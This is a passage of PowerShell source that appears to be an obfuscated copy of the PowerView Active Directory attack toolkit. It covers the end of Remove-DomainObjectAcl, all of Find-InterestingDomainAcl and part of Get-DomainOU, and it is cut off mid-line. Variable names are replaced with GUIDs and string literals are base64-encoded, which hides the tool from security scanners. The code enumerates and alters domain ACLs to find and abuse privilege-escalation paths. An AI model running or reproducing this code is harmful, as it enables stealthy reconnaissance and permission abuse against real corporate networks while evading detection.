${536c95c6ac344afbad492821cdfaf6d0}
                            
${abd67b00d80f4f4186e0a9dcac65a4e2} = 
[System.DirectoryServices.ActiveDirectoryRights] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                           
 ${28e002edc5af4b2d8fd052d89cb97144} += New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule $Identity, 
${abd67b00d80f4f4186e0a9dcac65a4e2}, 
${9d4ad4fd968448dc9b1db62924580868}, 
${549f6c3975f0474e8a22ad09deb46f3e}, $InheritanceType
                
        }
                    }
                    else {
             
           ${abd67b00d80f4f4186e0a9dcac65a4e2} = 
[System.DirectoryServices.ActiveDirectoryRights] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        
${28e002edc5af4b2d8fd052d89cb97144} += New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule $Identity, 
${abd67b00d80f4f4186e0a9dcac65a4e2}, 
${9d4ad4fd968448dc9b1db62924580868}, $InheritanceType
                
    }
                    ForEach 
(${2eeb97e7673d438b98bd02924fa03721} in 
${28e002edc5af4b2d8fd052d89cb97144}) {
                        
Write-Verbose "[Remove-DomainObjectAcl] Granting principal 
$(${879aa1a407054d1ebb0a151e486c44bb}.distinguishedname) rights GUID 
'$(${2eeb97e7673d438b98bd02924fa03721}.ObjectType)' on 
$(${d206fb27c46c457685596d5b60010b1a}.Properties.distinguishedname)"
                        ${724b98f5dcd04d7dade149fb3cf3d520} = 
${d206fb27c46c457685596d5b60010b1a}.GetDirectoryEntry()
              
          
${724b98f5dcd04d7dade149fb3cf3d520}.PsBase.Options.SecurityMasks = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABhAGMAbAA=')))
                        
${724b98f5dcd04d7dade149fb3cf3d520}.PsBase.ObjectSecurity.RemoveAcce
ssRule(${2eeb97e7673d438b98bd02924fa03721})
                        
${724b98f5dcd04d7dade149fb3cf3d520}.PsBase.CommitChanges()
           
         }
                }
                catch {
                   
 Write-Verbose "[Remove-DomainObjectAcl] Error removing principal 
$(${879aa1a407054d1ebb0a151e486c44bb}.distinguishedname) '$Rights' 
from 
$(${d206fb27c46c457685596d5b60010b1a}.Properties.distinguishedname) 
: $_"
                }
            }
        }
    }
}
function Find-
InterestingDomainAcl {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DomainName', 'Name')]
        [String]
        
$Domain,
        [Switch]
        $ResolveGUIDs,
        [String]
       
 [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        
$RightsFilter,
        [ValidateNotNullOrEmpty()]
        [Alias
('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${1063fd71be6347a0b04981bec0366176} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) 
{ ${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))] = $ResolveGUIDs }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) 
{ ${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))] = $RightsFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${caa6d77f782f4b31a5c47dcf7e394b17} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAYwBsAGEAcw
BzAA==')))
            'Raw' = $True
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${e95ff9a0cfb548dba5f1385fe67fc468} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${fff6219d49074ce58e67d127e91252d1} = @{}
    }
    PROCESS {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain
            
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain
        }
        Get-
DomainObjectAcl @1063fd71be6347a0b04981bec0366176 | ForEach-Object 
{
            if ( ($_.ActiveDirectoryRights -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARA
BlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -
match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
              
  if ($_.SecurityIdentifier.Value -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) 
{
                    if (${fff6219d49074ce58e67d127e91252d1}
[$_.SecurityIdentifier.Value]) {
                        
${d36ce7b78dab4e718686ee0c1b661d5b}, 
${e402652d73fa4bc491976928926c783e}, 
${1316739c2ba14b028935427e5b0e92c4}, 
${9497c3fbd8a74e5ca8b4c510cec38cfd} = 
${fff6219d49074ce58e67d127e91252d1}[$_.SecurityIdentifier.Value]
     
                   ${1bf222a75c5f47cca821092167ca26c4} = New-Object 
PSObject
                        ${1bf222a75c5f47cca821092167ca26c4} 
| Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) 
$_.ObjectDN
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
               
         ${1bf222a75c5f47cca821092167ca26c4} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) 
$_.ActiveDirectoryRights
                        if 
($_.ObjectAceType) {
                            
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
          
              }
                        else {
                        
    ${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAG4AZQA=')))
                        }
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) 
$_.InheritanceFlags
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) 
$_.SecurityIdentifier
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) 
${d36ce7b78dab4e718686ee0c1b661d5b}
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA==')
)) ${e402652d73fa4bc491976928926c783e}
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) 
${1316739c2ba14b028935427e5b0e92c4}
                        
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) 
${9497c3fbd8a74e5ca8b4c510cec38cfd}
                        
${1bf222a75c5f47cca821092167ca26c4}
                    }
             
       else {
                        
${1316739c2ba14b028935427e5b0e92c4} = Convert-ADName -Identity 
$_.SecurityIdentifier.Value -OutputType DN 
@e95ff9a0cfb548dba5f1385fe67fc468
                        if 
(${1316739c2ba14b028935427e5b0e92c4}) {
                            
${e402652d73fa4bc491976928926c783e} = 
${1316739c2ba14b028935427e5b0e92c4}.SubString
(${1316739c2ba14b028935427e5b0e92c4}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                     ${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${e402652d73fa4bc491976928926c783e}
        
                    ${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${1316739c2ba14b028935427e5b0e92c4}
                            
$Object = Get-DomainObject @caa6d77f782f4b31a5c47dcf7e394b17
         
                   if ($Object) {
                                
${d36ce7b78dab4e718686ee0c1b661d5b} = 
$Object.Properties.samaccountname[0]
                                
if ($Object.Properties.objectclass -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YwBvAG0AcAB1AHQAZQByAA==')))) {
                                    
${9497c3fbd8a74e5ca8b4c510cec38cfd} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YwBvAG0AcAB1AHQAZQByAA==')))
                                }
      
                          elseif ($Object.Properties.objectclass -
match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                
                    ${9497c3fbd8a74e5ca8b4c510cec38cfd} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwByAG8AdQBwAA==')))
                                }
              
                  elseif ($Object.Properties.objectclass -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgA=')))) {
                                    
${9497c3fbd8a74e5ca8b4c510cec38cfd} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgA=')))
                                }
                  
              else {
                                    
${9497c3fbd8a74e5ca8b4c510cec38cfd} = $Null
                          
      }
                                
${fff6219d49074ce58e67d127e91252d1}[$_.SecurityIdentifier.Value] = 
${d36ce7b78dab4e718686ee0c1b661d5b}, 
${e402652d73fa4bc491976928926c783e}, 
${1316739c2ba14b028935427e5b0e92c4}, 
${9497c3fbd8a74e5ca8b4c510cec38cfd}
                                
${1bf222a75c5f47cca821092167ca26c4} = New-Object PSObject
            
                    ${1bf222a75c5f47cca821092167ca26c4} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) 
$_.ObjectDN
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
               
                 ${1bf222a75c5f47cca821092167ca26c4} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) 
$_.ActiveDirectoryRights
                                if 
($_.ObjectAceType) {
                                    
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
          
                      }
                                else {
        
                            ${1bf222a75c5f47cca821092167ca26c4} | 
Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAG4AZQA=')))
                                }
                  
              ${1bf222a75c5f47cca821092167ca26c4} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) 
$_.AceFlags
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) 
$_.InheritanceFlags
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) 
$_.SecurityIdentifier
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) 
${d36ce7b78dab4e718686ee0c1b661d5b}
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA==')
)) ${e402652d73fa4bc491976928926c783e}
                               
 ${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) 
${1316739c2ba14b028935427e5b0e92c4}
                                
${1bf222a75c5f47cca821092167ca26c4} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) 
${9497c3fbd8a74e5ca8b4c510cec38cfd}
                                
${1bf222a75c5f47cca821092167ca26c4}
                            }
     
                   }
                        else {
                   
         Write-Warning "[Find-InterestingDomainAcl] Unable to 
convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname 
with Convert-ADName"
                        }
                    }
   
             }
            }
        }
    }
}
function Get-DomainOU {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Name')]
        [String[]]
        $Identity,
   
     [ValidateNotNullOrEmpty()]
        [String]
        [Alias
('GUID')]
        $GPLink,
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
     
   [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet
('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        
$SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias
('ReturnOne')]
        [Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${0b59591f1dac46899e2644150bfd6276} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
(${0b59591f1dac46899e2644150bfd6276}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBPAFUAPQAuACoA')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQB4AHQAcgBhAGMAdABlAGQAIA
